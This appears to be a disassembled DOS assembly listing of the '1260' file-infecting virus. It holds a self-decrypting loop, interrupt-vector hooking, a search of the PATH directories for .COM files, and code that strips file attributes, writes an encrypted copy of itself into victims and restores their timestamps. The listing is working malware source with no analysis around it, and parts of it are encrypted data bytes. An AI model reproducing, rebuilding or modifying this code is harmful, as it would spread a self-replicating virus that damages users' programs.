

DATA_1E		EQU	4
DATA_2E		EQU	6
DATA_3E		EQU	0CH
DATA_4E		EQU	0EH
DATA_5E		EQU	2CH
DATA_6E		EQU	2CH
DATA_7E		EQU	0F7H
DATA_8E		EQU	0FBH
DATA_11E	EQU	901H
DATA_12E	EQU	1002H
DATA_13E	EQU	1802H
DATA_14E	EQU	1F01H
DATA_15E	EQU	3918H
DATA_16E	EQU	57C6H
DATA_17E	EQU	0F046H
DATA_18E	EQU	0FFDCH
DATA_19E	EQU	0FFDEH


CODE_SEG	SEGMENT
		ASSUME	CS:CODE_SEG, DS:CODE_SEG
		ORG	100h


1260		PROC	FAR

START:
		JMP	DECRYPT_ROUTINE

DECRYPT_ROUTINE:
	NOP
	MOV	DI,12AH
	MOV	AX,9ECDH
	DEC	BX
	CLC
	CLD
	MOV	CX,4DDH

LOCLOOP_3:
	SUB	BX,AX
	XOR	BX,CX
	NOP
	XOR	[DI],AX
	XOR	[DI],CX
	INC	DI
	INC	AX
	NOP
	LOOP	LOCLOOP_3			; Loop if cx > 0
	CLC					; Clear carry flag
	DEC	BX
	INC	AX
	DEC	BX
	INC	BX
	DEC	BX
	CLC					; Clear carry flag
	INC	DI
	INC	DX
	CLC					; Clear carry flag
	INC	DX
	NOP
	MOV	BP,SP
	SUB	SP,24H
	PUSH	CX
	MOV	DX,4E0H
	MOV	[BP-14H],DX
	PUSH	DS
	MOV	AX,0
	PUSH	AX
	POP	DS
	CLI					; Disable interrupts
	MOV	AX,DS:DATA_1E
	MOV	SS:DATA_18E[BP],AX
	MOV	AX,DS:DATA_2E
	MOV	SS:DATA_19E[BP],AX
	MOV	AX,DS:DATA_3E
	MOV	[BP-20H],AX
	MOV	AX,DS:DATA_4E
	MOV	[BP-1EH],AX
	STI					; Enable interrupts
	POP	DS
	CALL	SUB_4
	MOV	SI,DX
	ADD	SI,90H
	MOV	DI,100H
	MOV	CX,3
	CLD					; Clear direction
	REP	MOVSB		; Rep while cx>0 Mov [si] to es:[di]
	MOV	SI,DX
	MOV	AH,30H				; '0'
	INT	21H		; DOS Services  ah=function 30h
					;  get DOS version number ax
	CMP	AL,0
	INT	3				; Debug breakpoint
	DAA					; Decimal adjust
	PUSH	DX
	ADD	BP,CX
	ADD	BYTE PTR [BP+SI],6
	MOV	AH,2FH				; '/'
	INT	21H		; DOS Services  ah=function 2Fh
					;  get DTA ptr into es:bx
	INT	3				; Debug breakpoint
	OR	AL,85H
	POP	SI
	CLD					; Clear direction
	INT	3				; Debug breakpoint
	SCASW					; Scan es:[di] for ax
	AND	AX,[BP-2]
	POP	ES
	MOV	DX,SI
	ADD	DX,0E1H
	MOV	AH,1AH
	INT	21H		; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
	PUSH	ES
	PUSH	SI
	MOV	ES,DS:DATA_6E
	MOV	DI,0

LOC_4:
	POP	SI
	PUSH	SI
	ADD	SI,9CH
	LODSB					; String [si] to al
	MOV	CX,8000H
	REPNE	SCASB		; Rept zf=0+cx>0 Scan es:[di] for al
	MOV	CX,4

LOCLOOP_5:
	LODSB					; String [si] to al
	SCASB					; Scan es:[di] for al
	JNZ	LOC_4				; Jump if not zero
	LOOP	LOCLOOP_5			; Loop if cx > 0

	POP	SI
	POP	ES
	MOV	[BP-0CH],DI
	MOV	BX,SI
	ADD	SI,0A1H
	MOV	DI,SI
	JMP	SHORT LOC_11
	DB	90H, 0CCH

LOC_6:
	CMP	WORD PTR [BP-0CH],0
	JNE	LOC_7				; Jump if not equal
	JMP	LOC_22
	DB	0CCH

LOC_7:
	PUSH	DS
	PUSH	SI
	MOV	DS,ES:DATA_5E
	MOV	DI,SI
	MOV	SI,ES:[BP-0CH]
	ADD	DI,0A1H

LOC_8:
	LODSB					; String [si] to al
	CMP	AL,3BH				; ';'
	JE	LOC_10				; Jump if equal
	CMP	AL,0
	JE	LOC_9				; Jump if equal
	STOSB					; Store al to es:[di]
	JMP	SHORT LOC_8
	DB	0CCH

LOC_9:
	MOV	SI,0

LOC_10:
	POP	BX
	POP	DS
	MOV	[BP-0CH],SI
	CMP	CH,0FFH
	JE	LOC_11				; Jump if equal
	MOV	AL,5CH				; '\'
	STOSB					; Store al to es:[di]

LOC_11:
	MOV	[BP-0EH],DI
	MOV	SI,BX
	ADD	SI,96H
	MOV	CX,6
	REP	MOVSB		; Rep while cx>0 Mov [si] to es:[di]
	MOV	SI,BX
	MOV	AH,4EH				; 'N'
	MOV	DX,SI
	ADD	DX,0A1H
	MOV	CX,3
	INT	21H		; DOS Services  ah=function 4Eh
			;  find 1st filenam match @ds:dx
	JMP	SHORT LOC_13
	DB	90H, 0CCH

LOC_12:
	MOV	AH,4FH				; 'O'
	INT	21H		; DOS Services  ah=function 4Fh
						;  find next filename match
LOC_13:
	JNC	LOC_14				; Jump if carry=0
	JMP	SHORT LOC_6
	DB	0CCH

LOC_14:
	MOV	AX,DS:DATA_7E[SI]
	AND	AL,1FH
	CMP	AL,1FH
	JE	LOC_12				; Jump if equal
	CMP	WORD PTR DS:DATA_8E[SI],0F800H
	JE	LOC_12				; Jump if equal
	CMP	WORD PTR DS:DATA_8E[SI],0AH
	JE	LOC_12				; Jump if equal
	MOV	DI,[BP-0EH]
	PUSH	SI
	ADD	SI,0FFH

LOC_15:
	LODSB					; String [si] to al
	STOSB					; Store al to es:[di]
	CMP	AL,0
	JNE	LOC_15				; Jump if not equal
	POP	SI
	MOV	AX,4300H
	MOV	DX,SI
	ADD	DX,0A1H
	INT	21H		; DOS Services  ah=function 43h
				;  get/set file attrb, nam@ds:dx
	MOV	[BP-0AH],CX
	MOV	AX,4301H
	AND	CX,0FFFEH
	MOV	DX,SI
	ADD	DX,0A1H
	INT	21H		; DOS Services  ah=function 43h
					;  get/set file attrb, nam@ds:dx
	MOV	AX,3D02H
	MOV	DX,SI
	ADD	DX,0A1H
	INT	21H		; DOS Services  ah=function 3Dh
				;  open file, al=mode,name@ds:dx
	JNC	LOC_16		; Jump if carry=0
	JMP	LOC_21
	DB	0CCH

LOC_16:
	MOV	BX,AX
	MOV	AX,5700H
	INT	21H		; DOS Services  ah=function 57h
				;  get/set file date & time
	MOV	[BP-8],CX
	MOV	[BP-6],DX
	MOV	AH,3FH				; '?'
	MOV	CX,3
	MOV	DX,SI
	ADD	DX,90H
	INT	21H		; DOS Services  ah=function 3Fh
				;  read file, cx=bytes, to ds:dx
	INT	3			; Debug breakpoint
	POP	BX
	SUB	[BP+SI],BX
	INT	3				; Debug breakpoint
	CMC					; Complement carry
	DB	0C8H, 3, 0, 0CCH, 42H, 37H
	DB	11H, 0CCH, 78H, 0C0H, 2, 42H
	DB	0CCH, 31H, 88H, 0, 0, 0BAH
	DB	0, 0, 0CDH, 21H, 73H, 3
	DB	0E9H, 15H, 1, 0CCH, 8AH, 0D9H
	DB	0CCH, 0DFH, 54H, 0C8H, 51H, 0CCH
	DB	85H, 0A8H, 3, 0, 0CCH, 0E0H
	DB	69H, 84H, 94H, 0, 81H, 0C1H
	DB	0DDH, 4, 0CCH, 64H, 0EFH, 0FEH
	DB	0CCH, 74H, 0F5H, 0EFH, 0AFH, 3
	DB	0CCH, 92H, 1BH, 0DH, 0B4H, 2CH
	DB	0CDH, 21H, 33H, 0D1H, 0CCH, 0FEH
	DB	77H, 56H, 0F0H, 0CCH, 0C1H, 29H
	DB	24H, 1, 0CCH, 0C8H, 43H, 46H
	DB	0F0H, 0CCH, 0E7H, 0C2H, 0FFH, 0
	DB	0CCH, 24H, 21H, 0C5H, 4, 0CCH
	DB	0CCH, 45H, 46H, 0E8H, 0CCH, 87H
	DB	0EH, 84H, 7, 0, 59H, 0CCH
	DB	0, 81H, 0C1H, 27H, 1, 89H
	DB	8CH

LOC_17:
	ADD	[BX+SI],AX
	INT	3				; Debug breakpoint
	NOP
	JS	LOC_17				; Jump if sign=1
	ADD	SS:DATA_17E[BP+DI],CL
	INT	3				; Debug breakpoint
	DB	3EH				; DS:
	MOV	BH,46H				; 'F'
	JMP	FAR PTR LOC_1
	DB	0CCH, 0E9H, 62H, 0FEH, 0CCH, 3

LOC_18:
	SUB	BH,0DDH
	ADD	CX,SP
	RCR	BYTE PTR SS:DATA_19E[BP+DI],1	; Rotate thru carry
	ADD	BX,27H
	MOV	WORD PTR [BP-1AH],7
	CALL	SUB_3
	MOV	[BP-12H],DI
	ADD	BX,10H
	INT	3				; Debug breakpoint
	DB	26H				; ES:
	LOOPZ	LOCLOOP_20			; Loop if zf=1, cx>0

	OUT	83H,AL			; port 83H, DMA page reg ch 1
	ADD	AH,CL
	DEC	SP
	MOVSB					; Mov [si] to es:[di]
	ADD	[BX+DI],AX
	ADD	BX,10H
	INT	3				; Debug breakpoint
	MOV	BH,5FH				; '_'
	CLC					; Clear carry flag
	ADD	[BX+DI+2],BH
	MOV	SI,[BP-14H]
	INT	3				; Debug breakpoint
	CLI					; Disable interrupts
	JNP	LOC_18				; Jump if not parity
	AND	AX,0F300H
	MOVSB					; Mov [si] to es:[di]
	MOV	AX,[BP-12H]
	SUB	AX,DI
	DEC	DI
	STOSB					; Store al to es:[di]

LOC_19:
	MOV	CX,[BP-14H]
	SUB	CX,3B6H
	CMP	CX,DI
	JE	LOC_27				; Jump if equal
	MOV	DX,0
	CALL	SUB_2
	JMP	SHORT LOC_19
	DB	0CCH, 8BH, 76H, 0ECH, 56H, 8BH
	DB	0FEH, 0CCH, 0A1H, 18H, 39H, 0
	DB	81H

LOCLOOP_20:
	DB	0C6H, 57H, 0, 0CCH, 3CH, 0BDH
	DB	0C7H, 0EH, 2, 8BH, 0D7H, 0F3H
	DB	0A4H, 5EH, 5BH, 0E8H, 92H, 0
	DB	5, 6, 0, 50H, 0FFH, 0E2H
	DB	0CCH, 0E9H, 9BH, 23H, 3DH, 0ECH
	DB	4, 0CCH, 63H, 16H, 1CH, 0B8H
	DB	0, 42H, 0B9H, 0, 0, 0BAH
	DB	0, 0, 0CDH, 21H, 72H, 0FH
	DB	0B4H, 40H, 0B9H, 3, 0, 0CCH
	DB	0D4H, 5FH, 0D6H, 81H, 0C2H, 93H
	DB	0, 0CDH, 21H, 8BH, 56H, 0FAH
	DB	8BH, 4EH, 0F8H, 81H, 0E1H, 0E0H
	DB	0FFH, 81H, 0C9H, 1FH, 0, 0B8H
	DB	1, 57H, 0CDH, 21H, 0B4H, 3EH
	DB	0CDH
	DB	21H

LOC_21:
	MOV	AX,4301H
	MOV	CX,[BP-0AH]
	MOV	DX,SI
	ADD	DX,0A1H
	INT	21H		; DOS Services  ah=function 43h
				;  get/set file attrb, nam@ds:dx

LOC_22:
	PUSH	DS
	MOV	DX,[BP-4]
	MOV	DS,[BP-2]
	MOV	AH,1AH
	INT	21H		; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
	POP	DS
	POP	CX
	XOR	AX,AX				; Zero register
	XOR	BX,BX				; Zero register
	XOR	DX,DX				; Zero register
	XOR	SI,SI				; Zero register
	MOV	SP,BP
	MOV	DI,100H
	PUSH	DI
	CALL	SUB_5
	RET
1260		ENDP


SUB_1		PROC	NEAR
	MOV	CX,[BP-10H]
	XOR	CX,813CH
	ADD	CX,9248H
	ROR	CX,1				; Rotate
	ROR	CX,1				; Rotate
	ROR	CX,1				; Rotate
	MOV	[BP-10H],CX
	AND	CX,7
	PUSH	CX
	INC	CX
	XOR	AX,AX				; Zero register
	STC					; Set carry flag
	RCL	AX,CL				; Rotate thru carry
	POP	CX
	RET
SUB_1		ENDP

	DB	58H, 50H, 0C3H

SUB_2		PROC	NEAR

LOC_23:
	CALL	SUB_1
	TEST	DX,AX
	JNZ	LOC_23				; Jump if not zero
	OR	DX,AX
	MOV	AX,CX
	SHL	AX,1				; Shift w/zeros fill
	PUSH	AX
	XLAT					; al=[al+[bx]] table
	MOV	CX,AX
	POP	AX
	INC	AX
	XLAT					; al=[al+[bx]] table
	ADD	AX,[BP-14H]
	MOV	SI,AX
	REP	MOVSB		; Rep while cx>0 Mov [si] to es:[di]
	RET
SUB_2		ENDP


SUB_3		PROC	NEAR
		MOV	DX,0

LOC_24:
	CALL	SUB_2
	MOV	AX,DX
	AND	AX,[BP-1AH]
	CMP	AX,[BP-1AH]
	JNE	LOC_24				; Jump if not equal
	RET
SUB_3		ENDP

	DB	53H, 8BH, 0DCH, 50H, 56H, 8BH
	DB	77H, 2, 0FFH, 47H, 2, 89H
	DB	76H, 0E4H, 0ACH, 30H, 4, 8AH
	DB	47H, 7, 0CH, 1, 88H, 47H
	DB	7, 5EH, 58H, 5BH, 0CFH, 53H
	DB	8BH, 0DCH, 50H, 56H, 8BH, 76H
	DB	0E4H, 0ACH, 30H, 4, 8AH, 47H
	DB	7, 24H, 0FEH, 88H, 47H, 7
	DB	5EH, 58H, 5BH, 0CFH

SUB_4		PROC	NEAR
	PUSHF					; Push flags
	PUSH	DS
	PUSH	AX
	MOV	AX,0
	PUSH	AX
	POP	DS
	MOV	AX,[BP-14H]
	SUB	AX,82H
	CLI					; Disable interrupts
	MOV	DS:DATA_3E,AX
	MOV	AX,[BP-14H]
	SUB	AX,65H
	MOV	DS:DATA_1E,AX
	PUSH	CS
	POP	AX
	MOV	DS:DATA_2E,AX
	MOV	DS:DATA_4E,AX
	STI					; Enable interrupts
	POP	AX
	POP	DS
	POPF					; Pop flags
	RET
SUB_4		ENDP


SUB_5		PROC	NEAR
	PUSHF					; Push flags
	PUSH	DS
	PUSH	AX
	MOV	AX,0
	PUSH	AX
	POP	DS
	MOV	AX,[BP-20H]
	CLI					; Disable interrupts
	MOV	DS:DATA_3E,AX
	MOV	AX,SS:DATA_18E[BP]
	MOV	DS:DATA_1E,AX
	MOV	AX,SS:DATA_19E[BP]
	MOV	DS:DATA_2E,AX
	MOV	AX,[BP-1EH]
	MOV	DS:DATA_4E,AX
	STI					; Enable interrupts
	POP	AX
	POP	DS
	POPF					; Pop flags
	RET
SUB_5		ENDP

	DB	0BFH, 2AH, 1, 0B8H, 0CDH, 9EH
	DB	0B9H, 0DDH, 4, 0F8H, 0FCH, 46H
	DB	4BH, 90H

LOCLOOP_25:
	XOR	[DI],AX
	XOR	[DI],CX
	XOR	DX,CX
	XOR	BX,CX
	SUB	BX,AX
	SUB	BX,CX
	SUB	BX,DX
	NOP
	INC	AX
	INC	DI
	INC	BX
	INC	SI
	INC	DX
	CLC					; Clear carry flag
	DEC	BX
	NOP
	LOOP	LOCLOOP_25			; Loop if cx > 0
	ADD	AX,[BX+SI]
	ADD	AX,[BP+DI]
	ADD	AX,DS:DATA_11E
	ADD	[BP+SI],CX
	ADD	[BP+DI],CX
	ADD	[SI],CX
	ADD	[DI],CX
	ADD	CL,DS:DATA_12E
	ADD	DL,[BP+SI]
	ADD	DL,[SI]
	ADD	DL,DS:DATA_13E
	ADD	BL,[BP+SI]
	ADD	[SI],BX
	ADD	[DI],BX
	ADD	DS:DATA_14E,BX
	ADD	[BX+SI],SP
	ADD	[BX+DI],SP
	ADD	[BP+SI],SP
	ADD	[BP+DI],SP
	ADD	[SI],SP
	MOV	CX,[BP-18H]
	MOV	AX,[BP-16H]
	MOV	DI,SI
	SUB	DI,3B6H
	CALL	SUB_6
	MOV	AH,40H				; '@'
	MOV	CX,4ECH
	MOV	DX,SI
	SUB	DX,3DDH
	INT	21H		; DOS Services  ah=function 40h
				;  write file cx=bytes, to ds:dx
	PUSHF					; Push flags
	PUSH	AX
	MOV	CX,[BP-18H]
	MOV	AX,[BP-16H]
	MOV	DI,SI
	SUB	DI,3B6H
	CALL	SUB_6
	POP	AX
	POPF					; Pop flags
	RET
SUB_6		PROC	NEAR

LOCLOOP_26:
	XOR	[DI],AX
	XOR	[DI],CX
	INC	AX
	INC	DI
	LOOP	LOCLOOP_26			; Loop if cx > 0
	RET
SUB_6		ENDP

		DB	90H, 0CDH, 20H, 0E9H, 0, 0
		DB	2AH, 2EH, 43H, 4FH, 4DH, 0
		DB	'PATH=1260.COM'
		DB	0, 0, 4DH
		DB	53 DUP (0)
		DB	3, 3FH
		DB	7 DUP (3FH)
		DB	43H, 4FH, 4DH, 3, 3, 0
		DB	6FH, 0, 0, 0, 0, 0
		DB	20H, 80H, 3, 21H, 0, 3
		DB	0, 0, 0
		DB	'1260.COM'
		DB	0, 0, 4DH, 0, 0, 0
		DB	0, 0

CODE_SEG	ENDS


	END	START
